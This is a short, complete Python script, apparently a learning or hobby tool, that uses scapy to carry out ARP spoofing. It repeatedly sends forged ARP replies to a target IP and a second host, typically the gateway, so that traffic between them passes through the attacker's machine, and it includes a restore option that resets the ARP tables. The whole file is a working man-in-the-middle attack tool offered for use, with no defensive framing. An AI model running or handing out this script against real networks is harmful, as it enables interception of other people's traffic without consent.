#! /bin/python
import scapy.all as scapy
import argparse
import os

def arp_ask(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request
    answered, unanswered = scapy.srp(packet, timeout=2, verbose=False)
    return answered[0][1].hwsrc # return the MAC address of the target // answered[0][1] is the ARP response

def arp_spoof(target_ip, spoof_ip):
    target_mac = arp_ask(target_ip)
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2) # we are telling the target that we are spoof ip
    scapy.send(arp_response, verbose=False)
    
def arp_restore(target_ip, spoof_ip):
    target_mac = arp_ask(target_ip)
    spoof_mac = arp_ask(spoof_ip)
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac, op=2) # we are telling the target the real mac address of the spoof ip
    scapy.send(arp_response, verbose=False)
    
def spoof(target_ip, spoof_ip):
    try:
        while True:
            arp_spoof(target_ip, spoof_ip)
            arp_spoof(spoof_ip, target_ip)
            print(f"[+] Sent spoof packets to {target_ip} and {spoof_ip}")
            
    except KeyboardInterrupt:
        print("Restoring ARP tables...")
        for i in range(2):
            arp_restore(target_ip, spoof_ip)
            arp_restore(spoof_ip, target_ip)
        print("ARP tables restored.")
        return



if __name__ == "__main__":
    args_parse = argparse.ArgumentParser(description="Spoof ip address")
    args_parse.add_argument('-t', '--target', type=str, help='IP of the target')
    args_parse.add_argument('-s', '--spoof', type=str, help='spoofed IP address')
    args_parse.add_argument('-r', '--restore', action='store_true', help='restore ARP tables')

    args = args_parse.parse_args()
    
    if not args.target or not args.spoof: 
        print("You must provide a target and a spoofed IP address")
        os._exit(1)

    if args.restore:
        arp_restore(args.target,args.spoof)
        arp_restore(args.spoof,args.target)
        print("ARP tables restored.")
    else:
        spoof(args.target,args.spoof)
